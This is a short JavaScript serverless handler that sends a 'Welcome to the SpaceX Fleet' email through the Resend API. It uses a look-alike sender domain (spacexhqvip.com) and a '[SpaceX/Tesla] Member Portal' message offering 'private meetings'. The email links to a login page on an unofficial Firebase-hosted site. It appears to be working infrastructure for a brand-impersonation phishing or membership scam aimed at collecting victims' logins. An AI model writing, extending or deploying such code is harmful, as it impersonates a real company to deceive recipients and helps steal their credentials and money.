import { getEmailTemplate } from '../email-template.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, email } = req.body;

  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const RESEND_API_KEY = process.env.RESEND_API_KEY;

  if (!RESEND_API_KEY) {
    return res.status(500).json({ error: 'RESEND_API_KEY is not configured' });
  }

  try {
    const html = getEmailTemplate({
        title: `Welcome to the Fleet, ${name || 'Space Voyager'}`,
        mainMessage: "Access granted. Your [SpaceX/Tesla] Member Portal is now online. Use it to schedule your next private meeting, find local meetups, or access exclusive member documents and more.",
        buttonText: "ACCESS PORTAL",
        buttonUrl: "https://spacexmembership-5cdc3.firebaseapp.com/pages/login.html"
    });

    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${RESEND_API_KEY}`,
      },
      body: JSON.stringify({
        from: 'SpaceX Operations <noreply@spacexhqvip.com>',
        to: [email],
        subject: 'Welcome to the SpaceX Fleet',
        html: html,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      return res.status(response.status).json(data);
    }

    return res.status(200).json(data);
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
